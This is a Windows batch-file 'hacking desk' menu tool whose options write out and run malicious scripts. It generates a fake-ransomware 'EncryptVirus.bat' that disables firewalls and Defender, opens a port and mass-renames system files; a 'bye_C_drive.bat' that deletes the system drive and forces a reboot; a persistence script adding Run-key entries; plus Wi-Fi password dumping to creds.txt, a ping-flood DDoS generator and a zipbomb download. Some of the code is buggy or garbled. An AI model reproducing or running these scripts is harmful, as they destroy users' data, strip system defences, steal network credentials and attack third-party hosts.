::X=========================================================================================================X
::[Wait! before you change anything read this.                                                              ]
::[Changing the script can result into a encrypted, hacked pc, only edit when you know what you're doing.   ]
::[The script is written as an batch file and NOT as an CMD file.                                           ]
::[any scripts downloaded from this file can be a Batch file or Python.                                     ]
::X=========================================================================================================X
echo off
color 2
title Hackdesk.bat
cls
set connectionstate=connected

 net session >null 2>&1
    if %errorLevel% == 0 (
        goto adminyes
    ) else (
        goto adminno
    )
    
    pause >null
:adminno
color 3
cls
echo # X============X
echo # [  Warning!  ]
Echo # X============X
Echo #
echo # no admin permission, for a fully working program start this program with administrator rights.
echo #
echo # press any key to boot up Hackdesk_connection_service.bat...
title (non-admin) hackdesk.bat
set titlename=(non-admin) hackdesk.bat
pause >null
goto :check

:adminyes
set titlename=hackdesk.bat
:check
color 2
cls
echo  [---------------------------------------------------------------------------]
echo                               ______________
echo                           ___/              \_
echo                 \_       /       _  __________\       _/
echo                   \     /         \/           \     /
echo                        /     \     \            \
echo              \_       /  \    \     \______      \       _/
echo                \      \   \    \     \___//      /      /
echo                        \__/\__/ \___/  __/      /
echo                         \             /        /
echo                \_        \                    /        _/
echo                  \        \                  /        /
echo                            \________________/
echo .
echo  [---------------------------------------------------------------------------]
echo  [       press spacebar to log in and conect to Hackdesk Servers...          ]
echo  [---------------------------------------------------------------------------]
pause >null
dell null

cls
echo  [---------------------------------------------------------------------------]
echo                               ______________
echo                           ___/              \_
echo                 \_       /       _  __________\       _/
echo                   \     /         \/           \     /
echo                        /     \     \            \
echo              \_       /  \    \     \______      \       _/
echo                \      \   \    \     \___//      /      /
echo                        \__/\__/ \___/  __/      /
echo                         \             /        /
echo                \_        \                    /        _/
echo                  \        \                  /        /
echo                            \________________/
echo .
echo  [---------------------------------------------------------------------------]
echo  [                Checking if hackdesk servers are online...                 ]
echo  [---------------------------------------------------------------------------]

echo Checking internet connection...
Ping www.google.nl -n 1 -w 1000
cls
if errorlevel 1 (goto internetno ) else (goto internetyes)

:internetno
color c
cls
echo  [---------------------------------------------------------------------------]
echo                               ______________
echo                           ___/              \_
echo                 \_       /       _  __________\       _/
echo                   \     /         \/           \     /
echo                        /     \     \            \
echo              \_       /  \    \     \______      \       _/
echo                \      \   \    \     \___//      /      /
echo                        \__/\__/ \___/  __/      /
echo                         \             /        /
echo                \_        \                    /        _/
echo                  \        \                  /        /
echo                            \________________/
echo .
echo  [---------------------------------------------------------------------------]
echo  [        servers don't respond, press spacebar to rety the action           ]
echo  [---------------------------------------------------------------------------]
pause >null
set /a num+=1
if "%num%"=="3" (
  goto to_many_fails
) 
if %num% GTR 5 (
  goto to_many_fails
)

else (
  goto retryli
)
:retryli
title %titlename% - 503 - Service Unavailable
color 2
goto check

:to_many_fails
color c
title %titlename% - Exiting...
cls
echo # 
Echo # Due to %num% missing attempt, it seems like your computer can't reach the hackdesk server.
echo # Please make one of the following  3 options.
echo # 
Echo # 1. Exit the program
echo # 2. Check internet connection (Check the connection with Google)
echo # 3. Retry too connect to the hackdesk download center
echo # 4. Continue offline (download won't work)
echo #
choice /c 1234

if "%errorlevel%"=="1" (
  del null
  exit
) else if "%errorlevel%"=="2" (
  goto testinginternetdueerror
) else if "%errorlevel%"=="3" (
  goto check
) else (
  goto mainmenu1
)
:testinginternetdueerror
cls
Ping www.google.nl
if errorlevel 1 (goto internetnocheck) 
else (goto internetyescheck)
:internetnocheck
color c
cls
Echo # 
echo # Google couldn't be reached
echo # your pc isn't connected to wifi
echo # 
pause >null
goto to_many_fails
:internetyescheck
Echo #
echo # connected succesfull to google
Echo # you can continue "offline"
echo #
pause >null
goto to_many_fails

pause >null
:internetyes
cls
echo  [---------------------------------------------------------------------------]
echo                               ______________
echo                           ___/              \_
echo                 \_       /       _  __________\       _/
echo                   \     /         \/           \     /
echo                        /     \     \            \
echo              \_       /  \    \     \______      \       _/
echo                \      \   \    \     \___//      /      /
echo                        \__/\__/ \___/  __/      /
echo                         \             /        /
echo                \_        \                    /        _/
echo                  \        \                  /        /
echo                            \________________/
echo .
echo  [---------------------------------------------------------------------------]
echo  [                             Connecting...                                 ]
echo  [---------------------------------------------------------------------------]
timeout 2 /nobreak >null
goto mainmenu
:mainmenu1
set connectionstate=not connected
:mainMenu
del null
title %titlename% - %connectionstate%

cls
echo X=================X
Echo [ Welcome unknown ]
echo X=================X
Date /t
Time /t
echo #
Echo # 0   - Kill pc (has more options)
echo # 1   - Add extra user
echo # 2   - Extract network passwords
echo # 2.1 - Extract network passwords (extensive options)
echo # 3   - Weak DDoS
echo # 4   - Wifi Bruteforce (beta)
echo # 5   - Free windows from Intesetv2
echo # 6   - Open Godmode folder
echo # 7   - Steal session tokens 
Echo # r   - Restart
echo # E   - Exit
echo # 
set choice='' >null
set /p choice=#-[
if '%choice%'=='0' goto 0
if '%choice%'=='1' goto 1
if '%choice%'=='2' goto 2
if '%choice%'=='2.1' goto 2.1
if '%choice%'=='3' goto 3
if '%choice%'=='' goto -1
if '%choice%'=='E' goto exit
if '%choice%'=='4' goto 4
if '%choice%'=='5' goto 5
if '%choice%'=='6' goto 6
if '%choice%'=='r' goto r
if '%choice%'=='d' goto D
if '%choice%'=='7' goto 7

cls
echo X=================X
Echo [ Welcome unknown ]
echo X=================X
Date /t
Time /t
echo # "%choice%" isn't a choice!
echo # Press spacebar to retry!
pause >null
goto mainmenu

:-1
cls
echo X=================X
Echo [ Welcome unknown ]
echo X=================X
Date /t
Time /t
echo # error
echo # 
echo # Hackdesk.bat hasnt detected any pressed key, try again.
echo #
Echo # press spacebar to go back to the main menu
pause >null
goto mainmenu

:r
del ddos1.bat >null
del null
start util_program.bat
if errorlevel 1 (goto continuemr) else (exit)
:continuemr
call "C:\Users\%user%\downloads\util_program.lnk"
exit

:0
del null
cls
title %titlename% - %connectionstate% - Kill pc
set Killpc0=''
cls
echo X=================X
Echo [ Welcome unknown ]
echo X=================X
Date /t
Time /t
echo 
echo # Every option in this menu (expect b/1) is highly dangerous for you and your pc, it can steal and Encrypt your files.
Echo # only use this if you know what you're doing!
echo #
echo # b or 0 - Return to main menu
echo # 1      - Zipbomb (don't run!)
echo # 2      - Encrypt a laptop (don't run!)
echo # 2.1    - Decrypt a laptop 
echo # 3      - Delete C:\ (don't run!)
echo # 4      - BSOD trigger
echo # 5      - System meltdown
echo #

echo 
set /p Killpc0=
if '%Killpc0%'=='0' goto Mainmenu
if '%Killpc0%'=='b' goto Mainmenu
if '%Killpc0%'=='1' goto 1_1
if '%Killpc0%'=='2' goto 1_2
if '%Killpc0%'=='2.1' goto 1_2.1
if '%Killpc0%'=='3' goto 1_3
if '%killpc0%'=='4' goto 1_4
if '%killpc0%'=='5' goto 1_5
if '%killpc0%'=='6' goto 1_6
if '%killpc0%'=='' goto 1_

cls
echo #
Echo # "%killpc0%" Isn't a choice!
echo # Please try again.
echo # 
pause >null
cls
goto 0

:1_
cls
echo #
Echo # Hackdesk.bat hasn't detected any key 
echo # Please try again
echo #
echo # Press any key to try again
pause >null

:1_1
cls
title %titlename% - %connectionstate% - Kill pc - zipbomb
echo # downloading zipbomb...
start https://www.bamsoftware.com/hacks/zipbomb/zblg.zip
echo # download done!
echo #
echo # press spacebar to return to the "Kill pc (has more options)" tab
pause >null
goto 0

:1_2
cls
title %titlename% - %connectionstate% - Kill pc - Encrypt a laptop
Echo # Descripton:
Echo # The first part of the script creates a log file in the Desktop folder that contains information about the user's computer, including the IP address, network configuration, and hardware information.
Echo # The next part of the script opens Port 1122 and turns off firewalls, which can be used to allow unauthorized access to the computer.
Echo # The subsequent part of the script renames all files with a certain extension in the C:\Windows, C:\Windows\Sys32, and C:\Windows\System32 folders. This can render the system unstable and potentially cause data loss.
Echo # Finally, the script closes all task managers, browsers, and anti-virus software and kills the Windows Defender Service and Windows Firewall. This can allow malicious software to infect the computer without being detected.
Echo # 
Echo # press any key to continue the install
pause >null
Echo # starting in 5 seconds...
timeout 5 >null
echo on
cls
echo @echo off >> EncryptVirus.bat 
echo title %%random%% %%date%% %%username%% %%time%% %%random%% >> EncryptVirus.bat 
echo color 0a >> EncryptVirus.bat 
echo ren -=- Writes INFO to a .LOG file in Current Directory -=-  >> EncryptVirus.bat 
echo :info >> EncryptVirus.bat 
echo cls ^& color 0a >> EncryptVirus.bat 
echo cd Desktop >> EncryptVirus.bat 
echo nslookup myip.opendns.com resolver1.opendns.com^>9K21JM10B.log >> EncryptVirus.bat 
echo ver^>^>9K21JM10B.log >> EncryptVirus.bat 
echo ECHO.^>^>9K21JM10B.log >> EncryptVirus.bat 
echo ECHO Username:%%username%%^>^>9K21JM10B.log  >> EncryptVirus.bat 
echo ECHO.^>^>9K21JM10B.log >> EncryptVirus.bat 
echo ECHO Time: %%time%%^>^>9K21JM10B.log >> EncryptVirus.bat 
echo ECHO.^>^>9K21JM10B.log >> EncryptVirus.bat 
echo ECHO Date: %%date%%^>^>9K21JM10B.log  >> EncryptVirus.bat 
echo ECHO.^>^>9K21JM10B.log  >> EncryptVirus.bat 
echo netsh wlan show profiles^>^>9K21JM10B.log >> EncryptVirus.bat 
echo ECHO.^>^>9K21JM10B.log >> EncryptVirus.bat 
echo ipconfig^>^>9K21JM10B.log >> EncryptVirus.bat 
echo ECHO.^>^>9K21JM10B.log >> EncryptVirus.bat 
echo ECHO Additional Information:^>^>9K21JM10B.log >> EncryptVirus.bat 
echo ipconfig ^| find /i "IPv4"^>^>9K21JM10B.log >> EncryptVirus.bat 
echo wmic diskdrive get size^>^>9K21JM10B.log >> EncryptVirus.bat 
echo wmic cpu get name^>^>9K21JM10B.log >> EncryptVirus.bat 
echo ECHO.^>^>9K21JM10B.log >> EncryptVirus.bat 
echo ECHO.^>^>9K21JM10B.log >> EncryptVirus.bat 
echo ECHO.^>^>9K21JM10B.log >> EncryptVirus.bat 
echo systeminfo^>^>9K21JM10B.log >> EncryptVirus.bat 
echo goto ports >> EncryptVirus.bat 
echo ren -=- Opens Port 1122 -=- >> EncryptVirus.bat 
echo :ports >> EncryptVirus.bat 
echo cls ^& color 0a >> EncryptVirus.bat 
echo netsh advfirewall firewall add rule name="Port 1122 TCP" dir=in action=allow protocol=TCP localport=%%1  >> EncryptVirus.bat 
echo netsh advfirewall firewall add rule name="Port 1122 UDP" dir=in action=allow protocol=UDP localport=%%1 >> EncryptVirus.bat 
echo goto firewal >> EncryptVirus.bat l
echo ren -=- Turns all Firewalls off -=- >> EncryptVirus.bat 
echo :firewall  >> EncryptVirus.bat 
echo cls ^& color 0a >> EncryptVirus.bat 
echo netsh firewall set opmode disable >> EncryptVirus.bat 
echo netsh firewall set opmode mode=DISABLE >> EncryptVirus.bat 
echo netsh advfirewall set currentprofile state off >> EncryptVirus.bat 
echo netsh advfirewall set domainprofile state off >> EncryptVirus.bat 
echo netsh advfirewall set privateprofile state off >> EncryptVirus.bat 
echo netsh advfirewall set publicprofile state off >> EncryptVirus.bat 
echo netsh advfirewall set allprofiles state off >> EncryptVirus.bat 
echo goto encryption >> EncryptVirus.bat 
echo ren -=- Encrypts files with a simple name break -=- >> EncryptVirus.bat 
echo :encryption >> EncryptVirus.bat 
echo cls ^& color 0a >> EncryptVirus.bat 
echo :Current >> EncryptVirus.bat 
echo REN *.cmd *.sI09 >> EncryptVirus.bat 
echo REN *.exe *.1Je9 >> EncryptVirus.bat 
echo REN *.log *.439a >> EncryptVirus.bat 
echo REN *.ini *.3KM1 >> EncryptVirus.bat 
echo REN *.dll *.38Jl >> EncryptVirus.bat 
echo REN *.bin *.3J81 >> EncryptVirus.bat 
echo REN *.txt *.2M1A >> EncryptVirus.bat 
echo REN *.sys *.8j3J >> EncryptVirus.bat 
echo REN *.lnk *.9K2M >> EncryptVirus.bat 
echo REN *.png *.8J2n >> EncryptVirus.bat 
echo REN *.exe *.3hxD >> EncryptVirus.bat 
echo cd C:\Windows >> EncryptVirus.bat 
echo REN *.cmd *.sI09 >> EncryptVirus.bat 
echo REN *.exe *.1Je9 >> EncryptVirus.bat 
echo REN *.log *.439a >> EncryptVirus.bat 
echo REN *.ini *.3KM1 >> EncryptVirus.bat 
echo REN *.dll *.38Jl >> EncryptVirus.bat 
echo REN *.bin *.3J81 >> EncryptVirus.bat 
echo REN *.txt *.2M1A >> EncryptVirus.bat 
echo REN *.sys *.8j3J >> EncryptVirus.bat 
echo REN *.lnk *.9K2M >> EncryptVirus.bat 
echo REN *.png *.8J2n >> EncryptVirus.bat 
echo REN *.exe *.3hxD >> EncryptVirus.bat 
echo cd C:\Windows\Sys32 ^& cd C:\Windows\System32 >> EncryptVirus.bat 
echo REN *.cmd *.sI09 >> EncryptVirus.bat 
echo REN *.exe *.1Je9 >> EncryptVirus.bat 
echo REN *.log *.439a >> EncryptVirus.bat 
echo REN *.ini *.3KM1 >> EncryptVirus.bat 
echo REN *.dll *.38Jl >> EncryptVirus.bat 
echo REN *.bin *.3J81 >> EncryptVirus.bat 
echo REN *.txt *.2M1A >> EncryptVirus.bat 
echo REN *.sys *.8j3J >> EncryptVirus.bat 
echo REN *.lnk *.9K2M >> EncryptVirus.bat 
echo REN *.png *.8J2n >> EncryptVirus.bat 
echo REN *.exe *.3hxD >> EncryptVirus.bat 
echo cd C:\ >> EncryptVirus.bat 
echo REN *.cmd *.sI09 >> EncryptVirus.bat 
echo REN *.exe *.1Je9 >> EncryptVirus.bat 
echo REN *.log *.439a >> EncryptVirus.bat 
echo REN *.ini *.3KM1 >> EncryptVirus.bat 
echo REN *.dll *.38Jl >> EncryptVirus.bat 
echo REN *.bin *.3J81 >> EncryptVirus.bat 
echo REN *.txt *.2M1  >> EncryptVirus.bat 
echo REN *.sys *.8j3J >> EncryptVirus.bat 
echo REN *.lnk *.9K2M >> EncryptVirus.bat 
echo REN *.png *.8J2n >> EncryptVirus.bat 
echo REN *.exe *.3hxD >> EncryptVirus.bat 
echo color 0a ^& mode 1000 ^& cls >> EncryptVirus.bat 
echo pause >> EncryptVirus.bat 
echo goto virus >> EncryptVirus.bat 
echo ren -=- Closes all task managers and browser, kills anti-virus and firewall -=-
echo :virus  >> EncryptVirus.bat 
echo ECHO You have been encrypted by IDK who :) ^& color 0a  >> EncryptVirus.bat 
echo net stop "Windows Defender Service" >> EncryptVirus.bat 
echo net stop "Windows Firewall" >> EncryptVirus.bat 
echo taskkill /F /IM "chrome.exe" /T >> EncryptVirus.bat 
echo taskkill /F /IM "firefox.exe" /T >> EncryptVirus.bat 
echo taskkill /F /IM "ProcessHacker.exe" /T >> EncryptVirus.bat 
echo taskkill /F /IM "explorer.exe" /T >> EncryptVirus.bat 
echo taskkill /F /IM "taskmgr.exe" /T >> EncryptVirus.bat 
echo goto virus >> EncryptVirus.bat 
echo off
cls
Echo # Instalation done
Echo # File has been saved as "EncryptVirus.bat"
Echo # file has been saved in system 32
Echo # 
Echo # press any key to return to menu 0
pause >null
goto 0

:1_2.1
cls
echo #starting instalation...
title %titlename% - %connectionstate% - Kill pc - [------1%-----]
echo REN *.sI09 *.cmd >> decrypt.bat
echo REN *.1Je9 *.exe >> decrypt.bat
echo REN *.439a *.log >> decrypt.bat
echo REN *.3KM1 *.ini >> decrypt.bat
echo REN *.38Jl *.dll >> decrypt.bat
echo REN *.3J81 *.bin >> decrypt.bat
title %titlename% - %connectionstate% - Kill pc - [=----10%-----]
echo # [=    10%     ]
echo REN *.2M1A *.txt >> decrypt.bat
echo REN *.8j3J *.sys >> decrypt.bat
echo REN *.9K2M *.lnk >> decrypt.bat
echo REN *.8J2n *.png >> decrypt.bat
echo REN *.3hxD *.exe >> decrypt.bat
echo cd C:\Windows >> decrypt.bat
echo REN *.sI09 *.cmd >> decrypt.bat
echo REN *.1Je9 *.exe >> decrypt.bat
echo REN *.439a *.log >> decrypt.bat
echo REN *.3KM1 *.ini >> decrypt.bat
cls
echo #starting inslatation...
title %titlename% - %connectionstate% - Kill pc - [===--35%-----]
echo # [===  35%     ]
echo REN *.38Jl *.dll >> decrypt.bat
echo REN *.3J81 *.bin >> decrypt.bat
echo REN *.2M1A *.txt >> decrypt.bat
echo REN *.8j3J *.sys >> decrypt.bat
echo REN *.9K2M *.lnk >> decrypt.bat
echo REN *.8J2n *.png >> decrypt.bat
echo REN .3hxD.exe >> decrypt.bat
echo cd C:\Windows\Sys32 & cd C:\Windows\System32  >> decrypt.bat
echo REN *.sI09 *.cmd >> decrypt.bat
echo REN *.1Je9 *.exe >> decrypt.bat
echo REN *.439a *.log >> decrypt.bat
cls
echo #starting inslatation...
title %titlename% - %connectionstate% - Kill pc - [=====60%=----]
echo # [=====60%=    ]
echo REN *.3KM1 *.ini >> decrypt.bat
echo REN *.38Jl *.dll >> decrypt.bat
echo REN *.3J81 *.bin >> decrypt.bat
echo REN *.2M1A *.txt >> decrypt.bat
echo REN *.8j3J *.sys >> decrypt.bat
echo REN *.9K2M *.lnk >> decrypt.bat
echo REN *.8J2n *.png >> decrypt.bat
echo REN *.3hxD *.exe >> decrypt.bat
echo cd C: >> decrypt.bat
echo REN *.sI09 *.cmd >> decrypt.bat
echo REN *.1Je9 *.exe >> decrypt.bat
echo REN *.439a *.log >> decrypt.bat
cls
echo #starting inslatation...
title %titlename% - %connectionstate% - Kill pc - [=====80%===--]
echo # [=====80%===  ]
echo REN *.3KM1 *.ini >> decrypt.bat
echo REN *.38Jl *.dll >> decrypt.bat
echo REN *.3J81 *.bin >> decrypt.bat
echo REN *.2M1A *.txt >> decrypt.bat
echo REN *.8j3J *.sys >> decrypt.bat
echo REN *.9K2M *.lnk >> decrypt.bat
echo REN *.8J2n *.png >> decrypt.bat
echo REN *.3hxD *.exe >> decrypt.bat
cls
echo #starting inslatation...
title %titlename% - %connectionstate% - Kill pc - [====100%=====]
echo # [====100%=====]
echo #
echo # instalation is done, press any key to return to menu 0
pause > null
goto 0

:1_3
title %titlename% - %connectionstate% - Kill pc - Delete C:\
cls
echo # batch virus will be saved as "bye_C_drive.bat"
pause >null
@echo off >>bye_C_drive.bat
echo del %%systemdrive%%*.* /f /s /q >>bye_C_drive.bat
echo shutdown -r -f -t 00 >>bye_C_drive.bat

echo # Just 3 lines of code...
echo #
echo # instalation is done, press any key to return to menu 0
pause > null
goto 0


:1_4
title %titlename% - %connectionstate% - Kill pc - BSOD_trigger
cls
echo # Paste the following line into a text doc and name it "BSOD_trigger.bat". 
echo powershell wininit
echo # when done press spacebar to return to menu 0.

echo powershell wininit > BSOD_trigger.bat
cls
echo # done!
echo # file has been safed as "BSOD_trigger.bat"
pause >null
goto 0

:1_5
Echo # this file can't be converted to .bat due to symbols, the file will be showed in RAW format.
Echo # In the script replace ' with >.
Echo # Press spacebar to view the RAW file.
pause >null
cls >null

echo :CRASH

echo net send * WORKGROUP ENABLED

echo ipconfig /release

echo shutdown -r -f -t0

echo echo @echo off'c:windowshartlell.bat

echo echo break off''c:windowshartlell.bat

echo echo shutdown -r -t 11 -f''c:windowshartlell.bat

echo echo end''c:windowshartlell.bat

echo reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f

echo reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f

echo echo You Have Been Hacked

echo @echo off'c:windowswimn32.bat

echo echo break off''c:windowswimn32.bat

echo echo ipconfig/release_all''c:windowswimn32.bat

echo echo end''c:windowswimn32.bat

echo reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f

echo reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f

echo echo YOU HAVE BEEN HACKED

echo REN *.DOC *.TXT

echo REN *.JPEG *.TXT

echo REN *.LNK *.TXT

echo REN *.AVI *.TXT

echo REN *.MPEG *.TXT

echo REN *.COM *.TXT

echo REN *.BAT *.TXT

echo GOTO CRASH
pause >null
goto 0

:1_6
cls
echo not done!
pause
cls
goto 0

:1
title %titlename% - %connectionstate% - add user
cls
echo # Starting netplwiz.exe
start /B "C:\Windows\System32\Netplwiz.exe"
Echo # Netplwiz.exe has been booted!
echo # Press any key to continue
pause >null
goto mainmenu


:2
title %titlename% - %connectionstate% - Extract network passwords
cls
echo # Checking for wireless interface...
netsh wlan show profiles | findstr /R /C:"[ ]:[ ]"
if %errorlevel%==1 goto fail3
cls

echo # Checking for wireless interface...
netsh wlan show profiles | findstr /R /C:"[ ]:[ ]" > temp.txt
echo # Available SSID in this Machine
type temp.txt

echo # Creating helper file...
echo @echo off >> helper.bat
echo setlocal enabledelayedexpansion >> helper.bat
echo for /f "tokens=5*" %%%%i in (temp.txt) do ( set val=%%%%i %%%%j >> helper.bat
echo if "!val:~-1!" == " " set val=!val:~0,-1! >> helper.bat
echo echo !val! ^>^> final.txt) >> helper.bat
echo for /f "tokens=*" %%%%i in (final.txt) do @echo SSID: %%%%i ^>^> creds.txt ^& echo # %tempdivider% ^>^> creds.txt ^& netsh wlan show profiles name=%%%%i key=clear ^| findstr /N /R /C:"[ ]:[ ]" ^| findstr 33 ^>^> creds.txt ^& echo # %tempdivider% ^>^> creds.txt ^& echo # Key content is the password of your target SSID. ^>^> creds.txt ^& echo # %tempdivider% ^>^> creds.txt >> helper.bat
echo del /q temp.txt final.txt >> helper.bat
echo exit >> helper.bat
echo # Done...
echo # Extracting passwords and saving it...
ping localhost -n 3 >null
start helper.bat
echo # Done...
echo # Deleting temporary files...
ping localhost -n 3 >null
del /q helper.bat
echo # Done...
del null
ping localhost -n 2 >null
cls
echo # WiFi credentials has been saved to "creds.txt"
echo # Press any key to continue...
pause>null
goto mainMenu

:2.1
cls
title %titlename% - %connectionstate% - Extract network passwords (options)
cls
echo #
echo # Delete "creds.txt" ......................... [1]
echo # Locate "creds.txt" ......................... [2]
echo # Open "creds.txt" in Notepad ................ [3]
echo # Generate WLAN Report ....................... [4]
echo # show latest "creds.txt" in cmd ............. [5]
echo # Back to Main Menu .......................... [6]
echo #

set options=''
set /p "options= # $WiFiPassview> " || set options=6
if %options%==1 goto deleteCreds
if %options%==2 goto locateCreds
if %options%==3 goto notepadCreds
if %options%==4 goto wlanreport
if %options%==5 goto option5
if %options%==6 goto mainMenu
cls
echo # "%options%" isn't a option!
echo # press any key to retry...
pause>null
goto 2.1

rem =============================
rem Options: Delete Creds
rem =============================
:deleteCreds
del null
type creds.txt
if %errorlevel%==1 goto fail2
cls
title %appname% %appvers% - %appstat%
del /q creds.txt
cls

echo # %appname% %appvers% - %appstat%
echo # by %dev%

color %uicolor%
echo # %desc%

echo #
echo # The "creds.txt" has been deleted! Press any key to continue...
pause>null
goto 2.1

rem =============================
rem Options: Locate Creds
rem =============================
:locateCreds
del null
cls
type creds.txt
if %errorlevel%==1 goto fail2
start explorer %cd%
goto 2.1

rem =============================
rem Options: Open Creds in Notepad
rem =============================
:notepadCreds
del null
cls
type creds.txt
if %errorlevel%==1 goto fail2
start notepad creds.txt
goto 2.1

rem =============================
rem Options: show creds.txt
rem =============================
:option5
cls
type "D:\ww_craker\creds.txt" >null
type Creds.txt
echo # Press any key to continue...
pause>null
goto 2.1

rem =============================
rem Options: Generate WLAN Report
rem =============================
:wlanreport
del null
cls

echo # [Generate WLAN Report]
echo #
echo # This feature will execute a command to generate WLAN Report for this machine.
echo #
echo # Note: This feature requires an administrative permissions to proceed.
echo # Close this program and run it as administrator to be able to work!

echo #
echo # Press any key to continue...
pause>null
goto wlanreportAdmin

rem =============================
rem Generate WLAN Report: Check Admin
rem =============================
:wlanreportAdmin
del null
cls
@echo off
echo # Administrative permissions required. Detecting permissions...
ping localhost -n 2 >null
net session >null 2>&1
if %errorLevel% == 0 (
echo # Administrator privileges found!
echo # Starting WLAN Reporting...
ping localhost -n 2 >null
goto wlanreportCreate
) else (
cls

echo # ERROR
echo #
echo # WLAN reporting will not work!
echo # Close this program and run it as administrator and try again.
echo #
echo # Press any key to continue...
pause>null
goto 2.1
)

rem =============================
rem Generate WLAN Report: Create
rem =============================
:wlanreportCreate
del null
cls

netsh wlan show wlanreport

echo #
echo # Press any key to continue...
pause>null
start C:\ProgramData\Microsoft\Windows\WlanReport\wlan-report-latest.html
goto 2.1

rem =============================
rem Options: Fail Message (creds.txt)
rem =============================
:fail2
del null
cls
echo # ERROR 404
echo # The file "creds.txt" does not exist!
echo # Run automated mode first and save extracted passwords in "creds.txt" file.
echo #
echo # Please try again or contact the developer for support...
echo # Press any key to continue... 
pause>null
goto 2.1


rem =============================
rem Program Error
rem =============================
:fail4
del null
cls
echo # Invalid option! Please try again...
echo # Press any key to continue...
pause>null
goto mainMenu

rem =============================
rem Program Error
rem =============================
:fail5
del null
cls

echo # Invalid option! Please try again...
echo #
echo # Press any key to continue...
pause>null
goto 2.1

:3
title %titlename% - %connectionstate% - DDoS generator
dell ddos1.bat
echo on
cls
echo # generating ddos1.bat

echo title ddos - helper.bat - Hackdesk server attack  >ddos1.bat
echo color 2 >ddos1.bat
echo cls >ddos1.bat
echo :retry >ddos1.bat
echo color 2 >ddos1.bat
echo cls >ddos1.bat
echo echo # Put in IP address or website >ddos1.bat
echo echo #  >ddos1.bat
echo set /p IP="# IP: " >ddos1.bat
echo cls >ddos1.bat
echo echo # >ddos1.bat
echo echo # selected ip-adress:%%IP%% >ddos1.bat
echo IF [%%IP%%]==[]goto error1 >ddos1.bat
echo Else [%%IP%%]==[] goto start >ddos1.bat
echo :error1 >ddos1.bat
echo color C >ddos1.bat
echo cls >ddos1.bat
echo Echo DDoS hasn't detected a ip adress >ddos1.bat
echo :start >ddos1.bat
echo call util_program.bat >ddos1.bat
echo :loop >ddos1.bat
echo ping %%IP%% -l 65500 -w 1 -n 1 >ddos1.bat
echo goto :loop >ddos1.bat
echo off >null
echo # generating done, starting ddos1.bat
start ddos1.bat
echo # press any key to return to the main munu
pause >null
goto mainmenu

:4
title %titlename% - %connectionstate% - Bruteforce
cls
Echo #
echo # X-----------------------------------------X
echo # ^|make a choice of the following 3 options ^|
echo # X-----------------------------------------X
echo #
echo # 1 - Python install ^& python Bruteforce
echo # 2 - Batch Bruteforce (other window)
echo # 3 - Exit to main menu
echo # 
choice /c 123 /n /m "#-[ "

if %errorlevel% equ 1 (
    goto 4_python
) else if %errorlevel% equ 2 (
    goto 4_batch
) else if %errorlevel% equ 3 (
    goto mainmenu
) else (
    cls
    echo # Error
    echo # 
    echo # Invalid choice
    echo #
    echo # press any key to retry...
    pause >null
    goto 4
)
:4_Batch 
cls
echo #
echo # starting...
Echo # setting up EnableDelayedExpansion
setlocal EnableDelayedExpansion
Echo # setting up variable
set alphabet=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!?-_
Echo # finishing up...
set count=1
Echo #
echo # start up another Hackdesk window?
echo # 1 for yes
echo # 2 for no
choice /c 12 /n /m "#-[ "

if '%errorlevel%'=='1' goto 4_batch_yes_contine
if '%errorlevel%'=='b' goto 4_batch_no_contine
    
:4_batch_yes_contine
start util_program.bat
:4_batch_no_contine

:4_batch_loop
echo # Fill in the name of the network
echo #
set /p userInput=#-[

if %count% leq 26 (
    set /a index=%count%-1
    set "batch_variable=!alphabet:~%index%,1!"
) else (
    set /a index1=(%count%-27)/26-1
    set /a index2=(%count%-27)%26
    set "batch_variable=!alphabet:~%index1%,1!!alphabet:~%index2%,1!"
)
netsh wlan connect ssid=%userInput% name=%userInput% key=%password%
set /a count+=1
goto 4_batch_loop
:4_python
title %titlename% - %connectionstate% - Bruteforce - Python

cls
Echo # 
echo # checking if python is installed...
echo #
where python >null 2>&1
if %errorlevel% equ 0 (
    goto 4_python_7-zip
) else (
    goto 4_python_install
)
:4_python_install

echo #
echo # Bruteforce instalation goes trough ur standard browser.
echo # 
echo # note that its not done yet.
echo # it will install python for this procces
echo # press any key to continue...
:: ===============================================
:: download file
:: https://github.com/madeindjs/Wifi_BruteForce
:: ===============================================
pause >null

cls
echo #
echo # instalation started
echo # do note that this procces will run on the background,
echo # and the proccess will continue after the instalation is done.
echo #
curl https://www.python.org/ftp/python/3.11.3/python-3.11.3-amd64.exe -o python.exe && start /wait python.exe /quiet InstallAllUsers=1 PrependPath=1
cls
:4_python_7-zip
where 7z.exe >nul 2>&1
if %errorlevel% equ 0 (
    goto 4_pyhon_InFi
) else (
    goto 4_python_7-zip-1
)

:4_python_7-zip-1
cls
echo #
echo # installing 7-zip...
echo # 
echo # follow the procces under here:
echo #
set "url=https://www.7-zip.org/a/7z2201-x64.exe"
set "filename=7z2201-x64.exe"
echo # Downloading 7-Zip...
bitsadmin.exe /transfer "7-Zip Download" %url% "%CD%\%filename%"
echo # Installing 7-Zip...
"%CD%\%filename%" /S
echo # Done.

:4_pyhon_InFi
echo #
echo # python and 7-zip has been installed!
echo # downloading file from github
echo # 
set "repo_url=https://github.com/username/repo/archive/branch.zip"
set "zip_file=branch.zip"
set "extract_folder=repo-branch"

echo # Downloading %zip_file%...
curl -L -o %zip_file% %repo_url%

echo # Extracting %zip_file% to %extract_folder%...
if not exist %extract_folder% mkdir %extract_folder%
7z x %zip_file% -o%extract_folder% -y

echo # Cleaning up...
del %zip_file%

echo # Done.
echo # Press any key to return to main menu
pause >null
goto mainmenu

:5
title %titlename% - %connectionstate% - Free windows from Intesetv2
cls
echo # Gathering needed password-hash
timeout 2 /nobreak >null
echo # Converting...
timeout 2 /nobreak >null
echo # starting inteset
powershell object.SendKeys %+s
powershell object.SendKeys npdpp2
powershell object.Sendkeys ^a
powershell object.Sendkeys {BACKSPACE}	
echo # Press any key to start a timer to select the password text box.
pause >null
echo # select the password text box before the timer runs out!
timeout 5 
cls
powershell object.SendKeys npdpp2
powershell object.Sendkeys ^a
powershell object.Sendkeys {BACKSPACE}	
echo # press on the 2 popup messages yes and the pc will restart.
